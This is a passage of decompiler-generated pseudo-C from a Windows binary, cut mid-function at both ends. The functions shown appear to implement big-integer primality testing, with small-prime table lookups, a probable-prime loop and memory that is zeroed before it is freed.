        v31 = 2 * v30;
        v32 = 2 * v30;
        if ( v31 >= v29 )
          v32 -= v29;
        sub_13F139920((_QWORD *)(a1 + 160), v29, (__int64)v39, (__int64)v43, v32);
        ++v3;
        --v28;
      }
      while ( v28 );
    }
    v33 = v45;
    if ( v44 < v45 )
      v33 = v44;
    v34 = (__int64)v46;
    if ( v46 )
    {
      memset(v46, 0, 8 * v33);
      sub_13F12E4D0(v34);
    }
    v35 = v41;
    if ( v40 < v41 )
      v35 = v40;
    v36 = (__int64)v42;
    if ( v42 )
    {
      memset(v42, 0, 8 * v35);
      sub_13F12E4D0(v36);
    }
  }
  else if ( (_DWORD)v4 )
  {
    v22 = (unsigned int)v4;
    do
    {
      v23 = sub_13F11EEE0(a1 + 96, *v3);
      sub_13F139920((_QWORD *)(a1 + 160), *v3++, a1, a1 + 96, v23);
      --v22;
    }
    while ( v22 );
  }
}
// 13F136C2E: conditional instruction was optimized away because rdx.8<0
// 13F136A90: using guessed type char var_68[16];
// 13F136A90: using guessed type __int128 var_38;

//----- (000000013F136E70) ----------------------------------------------------
_BOOL8 __fastcall sub_13F136E70(__int64 a1)
{
  bool v2; // bl
  unsigned __int64 v3; // rcx
  __int64 v4; // rdx
  char v6[16]; // [rsp+28h] [rbp-40h] BYREF
  unsigned __int64 v7; // [rsp+38h] [rbp-30h]
  unsigned __int64 v8; // [rsp+40h] [rbp-28h]
  void *v9; // [rsp+48h] [rbp-20h]

  sub_13F112AD0((__int64)v6, 2u);
  v2 = sub_13F137E00(a1, (__int64)v6);
  v3 = v8;
  if ( v7 < v8 )
    v3 = v7;
  v4 = (__int64)v9;
  if ( v9 )
  {
    memset(v9, 0, 8 * v3);
    sub_13F12E4D0(v4);
  }
  return v2;
}

//----- (000000013F136EE0) ----------------------------------------------------
__int64 __fastcall sub_13F136EE0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v6; // rsi
  int v7; // ebx
  __int64 (__fastcall *(**v8)[4])(); // rax
  unsigned __int8 v9; // bl
  unsigned __int16 **v10; // rax
  unsigned __int16 *v11; // r12
  __int64 v12; // r13
  bool v13; // r14
  unsigned __int64 v14; // rcx
  __int64 v15; // rdx
  unsigned __int64 v16; // r8
  __int64 v17; // rdx
  unsigned __int16 *v18; // r14
  unsigned __int16 *v19; // rdi
  unsigned __int64 v20; // r13
  int v21; // edi
  bool v22; // r12
  unsigned __int64 v23; // rcx
  __int64 v24; // rdx
  unsigned __int64 v25; // rcx
  __int64 v26; // rdx
  unsigned __int64 v27; // rcx
  __int64 v28; // rdx
  unsigned __int64 v29; // rcx
  __int64 v30; // rdx
  unsigned __int64 v31; // rcx
  __int64 v32; // rdx
  __int64 v33; // rdi
  __int64 v34; // rax
  unsigned __int64 v35; // rcx
  __int64 v36; // rdx
  unsigned __int64 v37; // rcx
  __int64 v38; // rdx
  unsigned __int64 v39; // rcx
  __int64 v40; // rdx
  unsigned __int64 v41; // rcx
  __int64 v42; // rdx
  unsigned __int64 v43; // rcx
  __int64 v44; // rdx
  unsigned __int64 v45; // rcx
  __int64 v46; // rdx
  unsigned __int64 v47; // rcx
  __int64 v48; // rdx
  unsigned __int64 v49; // rcx
  __int64 v50; // rdx
  char v52[16]; // [rsp+38h] [rbp-C8h] BYREF
  unsigned __int64 v53; // [rsp+48h] [rbp-B8h]
  unsigned __int64 v54; // [rsp+50h] [rbp-B0h]
  void *v55; // [rsp+58h] [rbp-A8h]
  char v56[16]; // [rsp+68h] [rbp-98h] BYREF
  unsigned __int64 v57; // [rsp+78h] [rbp-88h]
  unsigned __int64 v58; // [rsp+80h] [rbp-80h]
  void *v59; // [rsp+88h] [rbp-78h]
  char v60[16]; // [rsp+98h] [rbp-68h] BYREF
  unsigned __int64 v61; // [rsp+A8h] [rbp-58h]
  unsigned __int64 v62; // [rsp+B0h] [rbp-50h]
  void *v63; // [rsp+B8h] [rbp-48h]
  unsigned __int16 *v64; // [rsp+C8h] [rbp-38h]
  char v65[16]; // [rsp+D0h] [rbp-30h] BYREF
  unsigned __int64 v66; // [rsp+E0h] [rbp-20h]
  unsigned __int64 v67; // [rsp+E8h] [rbp-18h]
  void *v68; // [rsp+F0h] [rbp-10h]
  __int64 v69; // [rsp+100h] [rbp+0h]
  char v70[16]; // [rsp+108h] [rbp+8h] BYREF
  unsigned __int64 v71; // [rsp+118h] [rbp+18h]
  unsigned __int64 v72; // [rsp+120h] [rbp+20h]
  void *v73; // [rsp+128h] [rbp+28h]
  char v74[16]; // [rsp+138h] [rbp+38h] BYREF
  unsigned __int64 v75; // [rsp+148h] [rbp+48h]
  unsigned __int64 v76; // [rsp+150h] [rbp+50h]
  void *v77; // [rsp+158h] [rbp+58h]
  __int64 v78[5]; // [rsp+170h] [rbp+70h] BYREF

  v69 = -2i64;
  v6 = a1;
  sub_13F11D850((__int64)v65, a3, a4);
  v7 = 8;
  v8 = sub_13F120160();
  if ( (unsigned int)sub_13F11C520((__int64)v65, (__int64)v8) )
  {
    if ( (int)sub_13F11C520(v6, (__int64)v65) <= 0
      && (int)sub_13F11C520((__int64)v65, a2) <= 0
      && sub_13F137550((__int64)v65)
      && (!a5 || (*(unsigned __int8 (__fastcall **)(__int64, char *))(*(_QWORD *)a5 + 8i64))(a5, v65)) )
    {
      sub_13F113500(v6, (__int64)v65);
      v9 = 1;
      goto LABEL_97;
    }
    goto LABEL_87;
  }
  v10 = (unsigned __int16 **)sub_13F139590();
  v11 = *v10;
  v12 = v10[1] - *v10;
  v64 = &(*v10)[(unsigned int)(v12 - 1)];
  sub_13F112AD0((__int64)v56, *v64);
  v13 = (int)sub_13F11C520(v6, (__int64)v56) <= 0;
  v14 = v58;
  if ( v57 < v58 )
    v14 = v57;
  v15 = (__int64)v59;
  if ( v59 )
  {
    memset(v59, 0, 8 * v14);
    sub_13F12E4D0(v15);
  }
  if ( v13 )
  {
    sub_13F113780(v6);
    if ( *(_DWORD *)(v6 + 40) == 1 || sub_13F113630(v6) )
    {
      v18 = v11;
    }
    else
    {
      v16 = (int)sub_13F11C770(v6);
      v17 = (unsigned int)v12;
      v18 = v11;
      if ( (_DWORD)v12 )
      {
        do
        {
          v19 = &v18[v17 >> 1];
          if ( v16 >= *v19 )
          {
            v18 = v19 + 1;
            v17 += -1 - (v17 >> 1);
          }
          else
          {
            v17 >>= 1;
          }
        }
        while ( v17 > 0 );
      }
    }
    v20 = (unsigned __int64)&v11[(unsigned int)v12];
    while ( 1 )
    {
      v21 = v7;
      v22 = 0;
      if ( (unsigned __int64)v18 < v20 )
      {
        sub_13F112AD0((__int64)v52, *v18);
        sub_13F11FD00((__int64)v52, (__int64)v60, a4);
        v7 |= 0x13u;
        if ( (unsigned int)sub_13F11C520((__int64)v60, a3)
          || a5
          && (sub_13F112AD0((__int64)v56, *v18),
              v7 = v21 | 0x17,
              !(*(unsigned __int8 (__fastcall **)(__int64, char *))(*(_QWORD *)a5 + 8i64))(a5, v56)) )
        {
          v22 = 1;
        }
      }
      if ( (v7 & 4) != 0 )
      {
        v7 &= ~4u;
        v23 = v58;
        if ( v57 < v58 )
          v23 = v57;
        v24 = (__int64)v59;
        if ( v59 )
        {
          memset(v59, 0, 8 * v23);
          sub_13F12E4D0(v24);
        }
      }
      if ( (v7 & 2) != 0 )
      {
        v7 &= ~2u;
        v25 = v62;
        if ( v61 < v62 )
          v25 = v61;
        v26 = (__int64)v63;
        if ( v63 )
        {
          memset(v63, 0, 8 * v25);
          sub_13F12E4D0(v26);
        }
      }
      if ( (v7 & 1) != 0 )
      {
        v7 &= ~1u;
        v27 = v54;
        if ( v53 < v54 )
          v27 = v53;
        v28 = (__int64)v55;
        if ( v55 )
        {
          memset(v55, 0, 8 * v27);
          sub_13F12E4D0(v28);
        }
      }
      if ( !v22 )
        break;
      ++v18;
    }
    v6 = a1;
    if ( (unsigned __int64)v18 < v20 )
    {
      sub_13F112AD0((__int64)v52, *v18);
      sub_13F113500(a1, (__int64)v52);
      v29 = v54;
      if ( v53 < v54 )
        v29 = v53;
      v30 = (__int64)v55;
      if ( v55 )
      {
        memset(v55, 0, 8 * v29);
        sub_13F12E4D0(v30);
      }
      v9 = (int)sub_13F11C520(a1, a2) <= 0;
      goto LABEL_97;
    }
    sub_13F112AD0((__int64)v52, *v64 + 1);
    sub_13F113500(a1, (__int64)v52);
    v31 = v54;
    if ( v53 < v54 )
      v31 = v53;
    v32 = (__int64)v55;
    if ( v55 )
    {
      memset(v55, 0, 8 * v31);
      sub_13F12E4D0(v32);
    }
  }
  if ( sub_13F11EB30(a4, 0i64) == 1 )
  {
    sub_13F112AD0((__int64)v56, 1u);
    sub_13F112AD0((__int64)v60, 2u);
    sub_13F112AD0((__int64)v52, 1u);
    v33 = sub_13F136810(a4, (__int64)v74, 1ui64);
    v34 = sub_13F136920((__int64)v70, a3, a4, (__int64)v52, (__int64)v60, (__int64)v56);
    v9 = sub_13F136EE0(v6, a2, v34, v33, a5);
    v35 = v72;
    if ( v71 < v72 )
      v35 = v71;
    v36 = (__int64)v73;
    if ( v73 )
    {
      memset(v73, 0, 8 * v35);
      sub_13F12E4D0(v36);
    }
    v37 = v76;
    if ( v75 < v76 )
      v37 = v75;
    v38 = (__int64)v77;
    if ( v77 )
    {
      memset(v77, 0, 8 * v37);
      sub_13F12E4D0(v38);
    }
    v39 = v54;
    if ( v53 < v54 )
      v39 = v53;
    v40 = (__int64)v55;
    if ( v55 )
    {
      memset(v55, 0, 8 * v39);
      sub_13F12E4D0(v40);
    }
    v41 = v62;
    if ( v61 < v62 )
      v41 = v61;
    v42 = (__int64)v63;
    if ( v63 )
    {
      memset(v63, 0, 8 * v41);
      sub_13F12E4D0(v42);
    }
    v43 = v58;
    if ( v57 < v58 )
      v43 = v57;
    v44 = (__int64)v59;
    if ( v59 )
    {
      memset(v59, 0, 8 * v43);
      sub_13F12E4D0(v44);
    }
  }
  else
  {
    sub_13F11FBB0(a3, (__int64)v60, v6);
    sub_13F11FD00((__int64)v60, (__int64)v52, a4);
    sub_13F113F60(v6, (__int64)v52);
    v45 = v54;
    if ( v53 < v54 )
      v45 = v53;
    v46 = (__int64)v55;
    if ( v55 )
    {
      memset(v55, 0, 8 * v45);
      sub_13F12E4D0(v46);
    }
    v47 = v62;
    if ( v61 < v62 )
      v47 = v61;
    v48 = (__int64)v63;
    if ( v63 )
    {
      memset(v63, 0, 8 * v47);
      sub_13F12E4D0(v48);
    }
    if ( (int)sub_13F11C520(v6, a2) > 0 )
    {
LABEL_87:
      v9 = 0;
      goto LABEL_97;
    }
    sub_13F1365C0((__int64)v78, v6, a2, a4, 0);
    while ( sub_13F139030(v78, v6) )
    {
      if ( (!a5 || (*(unsigned __int8 (__fastcall **)(__int64, __int64))(*(_QWORD *)a5 + 8i64))(a5, v6))
        && sub_13F136E70(v6)
        && sub_13F137550(v6) )
      {
        v9 = 1;
        goto LABEL_96;
      }
    }
    v9 = 0;
LABEL_96:
    sub_13F1366E0(v78);
  }
LABEL_97:
  v49 = v67;
  if ( v66 < v67 )
    v49 = v66;
  v50 = (__int64)v68;
  if ( v68 )
  {
    memset(v68, 0, 8 * v49);
    sub_13F12E4D0(v50);
  }
  return v9;
}
// 13F136EE0: using guessed type char var_138[16];
// 13F136EE0: using guessed type char var_168[16];
// 13F136EE0: using guessed type _QWORD var_100[5];

//----- (000000013F137550) ----------------------------------------------------
bool __fastcall sub_13F137550(__int64 a1)
{
  char v2; // bp
  bool v3; // bl
  unsigned __int64 v4; // rcx
  __int64 v5; // rdx
  __int64 v6; // rax
  unsigned __int16 *v7; // rbx
  __int64 v8; // r14
  bool v9; // r15
  unsigned __int64 v10; // rcx
  __int64 v11; // rdx
  unsigned __int16 v12; // di
  __int64 v13; // rdx
  unsigned __int16 *v14; // r8
  unsigned __int16 *v15; // rax
  __int64 v17; // rax
  _QWORD *v18; // rax
  _QWORD *v19; // rax
  bool v20; // bl
  unsigned __int64 v21; // rcx
  __int64 v22; // rdx
  char v23[16]; // [rsp+28h] [rbp-50h] BYREF
  unsigned __int64 v24; // [rsp+38h] [rbp-40h]
  unsigned __int64 v25; // [rsp+40h] [rbp-38h]
  void *v26; // [rsp+48h] [rbp-30h]

  v2 = 0;
  sub_13F112AD0((__int64)v23, 0x7FCFu);
  v3 = (int)sub_13F11C520(a1, (__int64)v23) <= 0;
  v4 = v25;
  if ( v24 < v25 )
    v4 = v24;
  v5 = (__int64)v26;
  if ( v26 )
  {
    memset(v26, 0, 8 * v4);
    sub_13F12E4D0(v5);
  }
  if ( v3 )
  {
    v6 = sub_13F139590();
    v7 = *(unsigned __int16 **)v6;
    v8 = (__int64)(*(_QWORD *)(v6 + 8) - *(_QWORD *)v6) >> 1;
    v9 = 0;
    if ( *(_DWORD *)(a1 + 40) != 1 && !sub_13F113630(a1) )
    {
      sub_13F112AD0((__int64)v23, v7[(unsigned int)(v8 - 1)]);
      v2 = 2;
      if ( (int)sub_13F11C520(a1, (__int64)v23) <= 0 )
        v9 = 1;
    }
    if ( (v2 & 2) != 0 )
    {
      v10 = v25;
      if ( v24 < v25 )
        v10 = v24;
      v11 = (__int64)v26;
      if ( v26 )
      {
        memset(v26, 0, 8 * v10);
        sub_13F12E4D0(v11);
      }
    }
    if ( !v9 )
      return 0;
    v12 = sub_13F11C770(a1);
    v13 = (unsigned int)v8;
    v14 = &v7[(unsigned int)v8];
    if ( (_DWORD)v8 )
    {
      do
      {
        v15 = &v7[v13 >> 1];
        if ( *v15 >= v12 )
        {
          v13 >>= 1;
        }
        else
        {
          v7 = v15 + 1;
          v13 += -1 - (v13 >> 1);
        }
      }
      while ( v13 > 0 );
    }
    return v7 != v14 && v12 >= *v7;
  }
  else
  {
    v17 = sub_13F1397A0();
    if ( (int)sub_13F11C520(a1, v17) > 0 )
    {
      v19 = (_QWORD *)sub_13F139590();
      v20 = 0;
      if ( !sub_13F139B50(a1, *(unsigned __int16 *)(*v19 + 2i64 * ((unsigned int)((__int64)(v19[1] - *v19) >> 1) - 1))) )
      {
        sub_13F112AD0((__int64)v23, 3u);
        v2 = 1;
        if ( sub_13F137E00(a1, (__int64)v23) && sub_13F1377C0(a1) )
          v20 = 1;
      }
      if ( (v2 & 1) != 0 )
      {
        v21 = v25;
        if ( v24 < v25 )
          v21 = v24;
        v22 = (__int64)v26;
        if ( v26 )
        {
          memset(v26, 0, 8 * v21);
          sub_13F12E4D0(v22);
        }
      }
      return v20;
    }
    else
    {
      v18 = (_QWORD *)sub_13F139590();
      return !sub_13F139B50(
                a1,
                *(unsigned __int16 *)(*v18 + 2i64 * ((unsigned int)((__int64)(v18[1] - *v18) >> 1) - 1)));
    }
  }
}

//----- (000000013F1377C0) ----------------------------------------------------
bool __fastcall sub_13F1377C0(__int64 a1)
{
  unsigned int v2; // er14
  int v3; // ebx
  int v4; // er15
  bool v5; // si
  unsigned __int64 v6; // rcx
  __int64 v7; // rdx
  bool v9; // bl
  unsigned __int64 v10; // rcx
  __int64 v11; // rdx
  int v12; // esi
  unsigned __int64 v13; // rcx
  __int64 v14; // rdx
  unsigned __int64 v15; // rcx
  __int64 v16; // rdx
  unsigned __int64 v17; // rcx
  __int64 v18; // rdx
  char v19; // di
  unsigned __int64 v20; // rcx
  __int64 v21; // rdx
  int v22; // ebx
  bool v23; // si
  unsigned __int64 v24; // rcx
  __int64 v25; // rdx
  unsigned __int64 v26; // rcx
  __int64 v27; // rdx
  unsigned int v28; // ebx
  unsigned __int64 v29; // rcx
  __int64 v30; // rdx
  unsigned __int64 v31; // rcx
  __int64 v32; // rdx
  unsigned __int64 v33; // rcx
  __int64 v34; // rdx
  unsigned __int64 v35; // rcx
  __int64 v36; // rdx
  unsigned __int64 v37; // rcx
  __int64 v38; // rdx
  bool v39; // si
  unsigned __int64 v40; // rcx
  __int64 v41; // rdx
  unsigned __int64 v42; // rcx
  __int64 v43; // rdx
  bool v44; // si
  unsigned __int64 v45; // rcx
  __int64 v46; // rdx
  char v47[16]; // [rsp+28h] [rbp-E0h] BYREF
  unsigned __int64 v48; // [rsp+38h] [rbp-D0h]
  unsigned __int64 v49; // [rsp+40h] [rbp-C8h]
  void *v50; // [rsp+48h] [rbp-C0h]
  char v51[16]; // [rsp+58h] [rbp-B0h] BYREF
  unsigned __int64 v52; // [rsp+68h] [rbp-A0h]
  unsigned __int64 v53; // [rsp+70h] [rbp-98h]
  void *v54; // [rsp+78h] [rbp-90h]
  char v55[16]; // [rsp+88h] [rbp-80h] BYREF
  unsigned __int64 v56; // [rsp+98h] [rbp-70h]
  unsigned __int64 v57; // [rsp+A0h] [rbp-68h]
  void *v58; // [rsp+A8h] [rbp-60h]
  char v59[16]; // [rsp+B8h] [rbp-50h] BYREF
  unsigned __int64 v60; // [rsp+C8h] [rbp-40h]
  unsigned __int64 v61; // [rsp+D0h] [rbp-38h]
  void *v62; // [rsp+D8h] [rbp-30h]
  char v63[8]; // [rsp+E8h] [rbp-20h] BYREF
  __int64 v64[5]; // [rsp+F0h] [rbp-18h] BYREF
  char v65[8]; // [rsp+118h] [rbp+10h] BYREF
  _QWORD v66[6]; // [rsp+120h] [rbp+18h] BYREF
  char v67[8]; // [rsp+150h] [rbp+48h] BYREF
  __int64 v68[5]; // [rsp+158h] [rbp+50h] BYREF
  char v69[8]; // [rsp+180h] [rbp+78h] BYREF
  __int64 v70[6]; // [rsp+188h] [rbp+80h] BYREF
  int v71; // [rsp+1F0h] [rbp+E8h]

  v66[5] = -2i64;
  v2 = 0;
  v3 = 0;
  v4 = 1;
  sub_13F112AD0((__int64)v47, 1u);
  v5 = (int)sub_13F11C520(a1, (__int64)v47) <= 0;
  v6 = v49;
  if ( v48 < v49 )
    v6 = v48;
  v7 = (__int64)v50;
  if ( v50 )
  {
    memset(v50, 0, 8 * v6);
    sub_13F12E4D0(v7);
  }
  if ( v5 )
    return 0;
  if ( !sub_13F11EB30(a1, 0i64) )
  {
    sub_13F112AD0((__int64)v47, 2u);
    v9 = (unsigned int)sub_13F11C520(a1, (__int64)v47) == 0;
    v10 = v49;
    if ( v48 < v49 )
      v10 = v48;
    v11 = (__int64)v50;
    if ( v50 )
    {
      memset(v50, 0, 8 * v10);
      sub_13F12E4D0(v11);
    }
    return v9;
  }
  sub_13F112AD0((__int64)v65, 3u);
  v12 = 0;
  while ( 1 )
  {
    sub_13F112AD0((__int64)v51, 4u);
    sub_13F1234E0((__int64)v65, (__int64)v55, (__int64)v65);
    sub_13F11FBB0((__int64)v55, (__int64)v47, (__int64)v51);
    v3 |= 0x18u;
    v71 = sub_13F1384E0((__int64)v47, a1);
    v13 = v49;
    if ( v48 < v49 )
      v13 = v48;
    v14 = (__int64)v50;
    if ( v50 )
    {
      memset(v50, 0, 8 * v13);
      sub_13F12E4D0(v14);
    }
    v15 = v57;
    if ( v56 < v57 )
      v15 = v56;
    v16 = (__int64)v58;
    if ( v58 )
    {
      memset(v58, 0, 8 * v15);
      sub_13F12E4D0(v16);
    }
    v17 = v53;
    if ( v52 < v53 )
      v17 = v52;
    v18 = (__int64)v54;
    if ( v54 )
    {
      memset(v54, 0, 8 * v17);
      sub_13F12E4D0(v18);
    }
    if ( v71 != 1 )
      break;
    if ( ++v12 == 64 && sub_13F11F6C0(a1) )
      goto LABEL_31;
    sub_13F113670((__int64)v65);
    sub_13F113670((__int64)v65);
  }
  if ( !v71 )
  {
LABEL_31:
    v19 = 0;
    goto LABEL_92;
  }
  sub_13F112AD0((__int64)v51, 1u);
  sub_13F120ED0(a1, (__int64)v67, (__int64)v51);
  v20 = v53;
  if ( v52 < v53 )
    v20 = v52;
  v21 = (__int64)v54;
  if ( v54 )
  {
    memset(v54, 0, 8 * v20);
    sub_13F12E4D0(v21);
  }
  if ( !sub_13F11EB30((__int64)v67, 0i64) )
  {
    do
      ++v2;
    while ( !sub_13F11EB30((__int64)v67, v2) );
  }
  sub_13F1135A0((__int64)v67, (__int64)v69, v2);
  sub_13F1386E0((__int64)v63, (__int64)v69, (__int64)v65, a1);
  sub_13F112AD0((__int64)v47, 2u);
  v22 = v3 | 0x21;
  v23 = 1;
  if ( (unsigned int)sub_13F11C520((__int64)v63, (__int64)v47) )
  {
    sub_13F112AD0((__int64)v55, 2u);
    sub_13F11FBB0(a1, (__int64)v51, (__int64)v55);
    v22 |= 0x86u;
    if ( (unsigned int)sub_13F11C520((__int64)v63, (__int64)v51) )
      v23 = 0;
  }
  if ( (v22 & 4) != 0 )
  {
    v22 &= ~4u;
    v24 = v53;
    if ( v52 < v53 )
      v24 = v52;
    v25 = (__int64)v54;
    if ( v54 )
    {
      memset(v54, 0, 8 * v24);
      sub_13F12E4D0(v25);
    }
  }
  if ( (v22 & 2) != 0 )
  {
    v22 &= ~2u;
    v26 = v57;
    if ( v56 < v57 )
      v26 = v56;
    v27 = (__int64)v58;
    if ( v58 )
    {
      memset(v58, 0, 8 * v26);
      sub_13F12E4D0(v27);
    }
  }
  v28 = v22 & 0xFFFFFFFE;
  v29 = v49;
  if ( v48 < v49 )
    v29 = v48;
  v30 = (__int64)v50;
  if ( v50 )
  {
    memset(v50, 0, 8 * v29);
    sub_13F12E4D0(v30);
  }
  if ( !v23 )
  {
    if ( v2 <= 1 )
    {
LABEL_89:
      v19 = 0;
      goto LABEL_91;
    }
    while ( 1 )
    {
      sub_13F112AD0((__int64)v59, 2u);
      sub_13F1234E0((__int64)v63, (__int64)v47, (__int64)v63);
      sub_13F11FBB0((__int64)v47, (__int64)v55, (__int64)v59);
      sub_13F11FD00((__int64)v55, (__int64)v51, a1);
      sub_13F113500((__int64)v63, (__int64)v51);
      v31 = v53;
      if ( v52 < v53 )
        v31 = v52;
      v32 = (__int64)v54;
      if ( v54 )
      {
        memset(v54, 0, 8 * v31);
        sub_13F12E4D0(v32);
      }
      v33 = v57;
      if ( v56 < v57 )
        v33 = v56;
      v34 = (__int64)v58;
      if ( v58 )
      {
        memset(v58, 0, 8 * v33);
        sub_13F12E4D0(v34);
      }
      v35 = v49;
      if ( v48 < v49 )
        v35 = v48;
      v36 = (__int64)v50;
      if ( v50 )
      {
        memset(v50, 0, 8 * v35);
        sub_13F12E4D0(v36);
      }
      v37 = v61;
      if ( v60 < v61 )
        v37 = v60;
      v38 = (__int64)v62;
      if ( v62 )
      {
        memset(v62, 0, 8 * v37);
        sub_13F12E4D0(v38);
      }
      sub_13F112AD0((__int64)v51, 2u);
      sub_13F11FBB0(a1, (__int64)v59, (__int64)v51);
      v28 |= 0xF00u;
      v39 = (unsigned int)sub_13F11C520((__int64)v63, (__int64)v59) == 0;
      v40 = v61;
      if ( v60 < v61 )
        v40 = v60;
      v41 = (__int64)v62;
      if ( v62 )
      {
        memset(v62, 0, 8 * v40);
        sub_13F12E4D0(v41);
      }
      v42 = v53;
      if ( v52 < v53 )
        v42 = v52;
      v43 = (__int64)v54;
      if ( v54 )
      {
        memset(v54, 0, 8 * v42);
        sub_13F12E4D0(v43);
      }
      if ( v39 )
        break;
      sub_13F112AD0((__int64)v59, 2u);
      v44 = (unsigned int)sub_13F11C520((__int64)v63, (__int64)v59) == 0;
      v45 = v61;
      if ( v60 < v61 )
        v45 = v60;
      v46 = (__int64)v62;
      if ( v62 )
      {
        memset(v62, 0, 8 * v45);
        sub_13F12E4D0(v46);
      }
      if ( !v44 && ++v4 < v2 )
        continue;
      goto LABEL_89;
    }
  }
  v19 = 1;
LABEL_91:
  sub_13F105180(v64);
  sub_13F105180(v70);
  sub_13F105180(v68);
LABEL_92:
  sub_13F105180(v66);
  return v19;
}
// 13F1377C0: using guessed type char var_C0[8];
// 13F1377C0: using guessed type char var_88[8];
// 13F1377C0: using guessed type char var_58[8];
// 13F1377C0: using guessed type char var_F0[8];
// 13F1377C0: using guessed type __int64 var_E8[5];
// 13F1377C0: using guessed type __int64 var_50[6];
// 13F1377C0: using guessed type __int64 var_80[5];

//----- (000000013F137E00) ----------------------------------------------------
bool __fastcall sub_13F137E00(__int64 a1, __int64 a2)
{
  unsigned int v4; // esi
  int v5; // ebx
  bool v6; // r14
  unsigned __int64 v7; // rcx
  __int64 v8; // rdx
  char v9; // r15
  bool v10; // bl
  unsigned __int64 v11; // rcx
  __int64 v12; // rdx
  unsigned __int64 v13; // rcx
  __int64 v14; // rdx
  bool v16; // r14
  unsigned __int64 v17; // rcx
  __int64 v18; // rdx
  unsigned __int64 v19; // rcx
  __int64 v20; // rdx
  unsigned __int64 v21; // rcx
  __int64 v22; // rdx
  unsigned __int64 v23; // rcx
  __int64 v24; // rdx
  int v25; // ebx
  bool v26; // r14
  unsigned int v27; // ebx
  unsigned __int64 v28; // rcx
  __int64 v29; // rdx
  unsigned __int64 v30; // rcx
  __int64 v31; // rdx
  unsigned __int64 v32; // rcx
  __int64 v33; // rdx
  unsigned __int64 v34; // rcx
  __int64 v35; // rdx
  int v36; // er14
  unsigned __int64 v37; // rcx
  __int64 v38; // rdx
  unsigned __int64 v39; // rcx
  __int64 v40; // rdx
  bool v41; // r12
  unsigned __int64 v42; // rcx
  __int64 v43; // rdx
  unsigned __int64 v44; // rcx
  __int64 v45; // rdx
  unsigned __int64 v46; // rcx
  __int64 v47; // rdx
  unsigned __int64 v48; // rcx
  __int64 v49; // rdx
  unsigned __int64 v50; // rcx
  __int64 v51; // rdx
  unsigned __int64 v52; // rcx
  __int64 v53; // rdx
  unsigned __int64 v54; // rcx
  __int64 v55; // rdx
  unsigned __int64 v56; // rcx
  __int64 v57; // rdx
  unsigned __int64 v58; // rcx
  __int64 v59; // rdx
  unsigned __int64 v60; // rcx
  __int64 v61; // rdx
  char v62[16]; // [rsp+28h] [rbp-E0h] BYREF
  unsigned __int64 v63; // [rsp+38h] [rbp-D0h]
  unsigned __int64 v64; // [rsp+40h] [rbp-C8h]
  void *v65; // [rsp+48h] [rbp-C0h]
  char v66[16]; // [rsp+58h] [rbp-B0h] BYREF
  unsigned __int64 v67; // [rsp+68h] [rbp-A0h]
  unsigned __int64 v68; // [rsp+70h] [rbp-98h]
  void *v69; // [rsp+78h] [rbp-90h]
  char v70[16]; // [rsp+88h] [rbp-80h] BYREF
  unsigned __int64 v71; // [rsp+98h] [rbp-70h]
  unsigned __int64 v72; // [rsp+A0h] [rbp-68h]
  void *v73; // [rsp+A8h] [rbp-60h]
  char v74[16]; // [rsp+B8h] [rbp-50h] BYREF
  unsigned __int64 v75; // [rsp+C8h] [rbp-40h]
  unsigned __int64 v76; // [rsp+D0h] [rbp-38h]
  void *v77; // [rsp+D8h] [rbp-30h]
  char v78[16]; // [rsp+E8h] [rbp-20h] BYREF
  unsigned __int64 v79; // [rsp+F8h] [rbp-10h]
  unsigned __int64 v80; // [rsp+100h] [rbp-8h]
  void *v81; // [rsp+108h] [rbp+0h]
  char v82[16]; // [rsp+118h] [rbp+10h] BYREF
  unsigned __int64 v83; // [rsp+128h] [rbp+20h]
  unsigned __int64 v84; // [rsp+130h] [rbp+28h]
  void *v85; // [rsp+138h] [rbp+30h]
  __int64 v86; // [rsp+148h] [rbp+40h]

  v86 = -2i64;
  v4 = 0;
  v5 = 0;
  sub_13F112AD0((__int64)v74, 3u);
  v6 = (int)sub_13F11C520(a1, (__int64)v74) <= 0;
  v7 = v76;
  if ( v75 < v76 )
    v7 = v75;
  v8 = (__int64)v77;
  if ( v77 )
  {
    memset(v77, 0, 8 * v7);
    sub_13F12E4D0(v8);
  }
  if ( v6 )
  {
    sub_13F112AD0((__int64)v78, 2u);
    v9 = 1;
    v10 = 1;
    if ( (unsigned int)sub_13F11C520(a1, (__int64)v78) )
    {
      sub_13F112AD0((__int64)v74, 3u);
      v9 = 3;
      if ( (unsigned int)sub_13F11C520(a1, (__int64)v74) )
        v10 = 0;
    }
    if ( (v9 & 2) != 0 )
    {
      v11 = v76;
      if ( v75 < v76 )
        v11 = v75;
      v12 = (__int64)v77;
      if ( v77 )
      {
        memset(v77, 0, 8 * v11);
        sub_13F12E4D0(v12);
      }
    }
    v13 = v80;
    if ( v79 < v80 )
      v13 = v79;
    v14 = (__int64)v81;
    if ( v81 )
    {
      memset(v81, 0, 8 * v13);
      sub_13F12E4D0(v14);
    }
    return v10;
  }
  v16 = 1;
  if ( sub_13F11EB30(a1, 0i64)
    || (sub_13F112AD0((__int64)v62, 2u), v5 = 4, !(unsigned int)sub_13F11C520(a1, (__int64)v62)) )
  {
    sub_13F112AD0((__int64)v74, 1u);
    sub_13F11D850((__int64)v78, a2, a1);
    v5 |= 0x58u;
    if ( !(unsigned int)sub_13F11C520((__int64)v78, (__int64)v74) )
      v16 = 0;
  }
  if ( (v5 & 0x10) != 0 )
  {
    v5 &= ~0x10u;
    v17 = v80;
    if ( v79 < v80 )
      v17 = v79;
    v18 = (__int64)v81;
    if ( v81 )
    {
      memset(v81, 0, 8 * v17);
      sub_13F12E4D0(v18);
    }
  }
  if ( (v5 & 8) != 0 )
  {
    v5 &= ~8u;
    v19 = v76;
    if ( v75 < v76 )
      v19 = v75;
    v20 = (__int64)v77;
    if ( v77 )
    {
      memset(v77, 0, 8 * v19);
      sub_13F12E4D0(v20);
    }
  }
  if ( (v5 & 4) != 0 )
  {
    v5 &= ~4u;
    v21 = v64;
    if ( v63 < v64 )
      v21 = v63;
    v22 = (__int64)v65;
    if ( v65 )
    {
      memset(v65, 0, 8 * v21);
      sub_13F12E4D0(v22);
    }
  }
  if ( v16 )
    return 0;
  sub_13F112AD0((__int64)v62, 1u);
  sub_13F11FBB0(a1, (__int64)v70, (__int64)v62);
  v23 = v64;
  if ( v63 < v64 )
    v23 = v63;
  v24 = (__int64)v65;
  if ( v65 )
  {
    memset(v65, 0, 8 * v23);
    sub_13F12E4D0(v24);
  }
  if ( !sub_13F11EB30((__int64)v70, 0i64) )
  {
    do
      ++v4;
    while ( !sub_13F11EB30((__int64)v70, v4) );
